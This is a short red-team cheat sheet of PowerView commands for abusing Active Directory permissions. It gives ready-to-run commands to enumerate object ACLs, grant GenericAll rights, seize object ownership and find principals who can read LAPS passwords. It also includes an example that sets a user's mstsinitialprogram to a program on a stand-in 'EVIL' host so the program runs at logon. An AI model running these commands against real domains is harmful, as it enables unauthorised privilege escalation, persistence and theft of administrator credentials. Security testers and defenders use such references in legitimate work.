# powerview

% ad, windows, powerview
#plateform/windows #target/remote  #cat/RECON 


## DACL - Get ACLs of an object 
```powershell
Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

## DACL - Find all domain user DACL
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## DACL - Add GenericAll to target for user
#cat/ATTACK/DACL-ABUSE
```powershell
Add-DomainObjectAcl -TargetIdentity <ldap_path> -PrincipalIdentity <current_user> -Rights All
```

## DACL - Set the owner 
#cat/ATTACK/DACL-ABUSE
```powershell
Set-DomainObjectOwner -Identity <target_object> -OwnerIdentity <user>
```

## DACL - set the specified property for the given user identity
@{'mstsinitialprogram'='\\EVIL\program.exe'}
#cat/ATTACK/DACL-ABUSE
```powershell
Set-DomainObject <user> -Set @{'<property>'='<value>'} -Verbose
```

## DACL - Enumerate Principals that can read LAPS
#cat/RECON/DACL
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }
```